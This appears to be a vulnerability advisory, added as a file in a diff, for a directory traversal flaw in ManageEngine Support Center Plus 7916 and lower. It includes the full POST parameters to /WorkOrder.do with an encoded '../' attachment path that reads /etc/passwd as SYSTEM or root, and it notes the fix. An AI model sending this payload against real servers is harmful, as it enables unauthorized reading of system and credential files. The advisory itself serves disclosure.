@@ -1,0 +1,62 @@
+-----------
+Author:
+-----------
+
+xistence < xistence[at]0x90[.]nl >
+
+-------------------------
+Affected products:
+-------------------------
+
+ManageEngine Support Center Plus 7916 and lower
+
+-------------------------
+Affected vendors:
+-------------------------
+
+ManageEngine
+http://www.manageengine.com/
+
+-------------------------
+Product description:
+-------------------------
+
+SupportCenter Plus is a web-based customer support software that lets
+organizations effectively manage customer tickets,
+their account & contact information, the service contracts and in the
+process providing a superior customer experience.
+
+----------
+Details:
+----------
+
+[ 0x01 - Directory Traversal ]
+
+Support Center Plus 7916 and lower is prone to a directory traversal
+vulnerability. When creating a ticket and attaching
+a file, this can be tampered to link to a local file on the server side.
+By downloading the attachment from the ticket, the server file is
+downloaded with the same privileges as the
+Support Center Plus instance, which on windows is SYSTEM. On linux Support
+Center Plus is mostly installed as the root user.
+
+POST parameters when submitting a ticket to the /WorkOrder.do url and
+attaching the server /etc/passwd:
+
+category=&MOD_IND=WorkOrder&attachments=passwd&subCategory=0&addWO=addWO&title=pwned&attPath=
+&component=Request&reqTemplate=&reqName=Guest&priority=2&item=0&reqID=2&attSize=31337&autoCCList=
+&FORMNAME=WorkOrderForm&usertypename=Requester
+&attach=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&prodId=0&description=pwned
+
+
+-----------
+Solution:
+-----------
+
+Upgrade to a build higher than 7916.
+
+--------------
+Timeline:
+--------------
+
+Fixed somewhere back in 2013 :)
